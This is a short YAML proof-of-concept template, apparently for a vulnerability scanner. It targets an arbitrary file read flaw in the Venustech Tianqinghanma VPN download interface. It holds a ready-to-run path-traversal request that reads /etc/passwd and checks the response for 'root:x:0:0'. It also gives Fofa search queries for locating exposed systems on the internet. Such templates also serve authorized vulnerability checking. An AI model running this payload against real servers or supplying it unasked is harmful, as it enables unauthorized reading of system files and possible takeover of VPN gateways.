id: 启明星辰-天清汉马VPN接口download任意文件读取
info:
  name: 启明星辰-天清汉马VPN接口download任意文件读取
  author: wy876

  severity: high
  description: |
     启明星辰天清汉马VPN系统download接口处存在任意文件读取漏洞，获取服务器的敏感数据和配置信息，造成系统的不安全性，从而控制服务器。
     Fofa: icon_hash="-15980305"
           app="网御星云-VPN" || (body="select_auth_method" && body="select_auth_input") || app="启明星辰-天清汉马VPN"
  reference:
    - https://github.com/wy876/POC/blob/main/启明星辰-天清汉马VPN接口download任意文件读取.md


rules:
  r0:
    request:
      method: GET
      path: /vpn/user/download/client?ostype=../../../../../../../etc/passwd
    expression: response.status == 200 && response.body.bcontains(b'root:x:0:0')

expression: r0()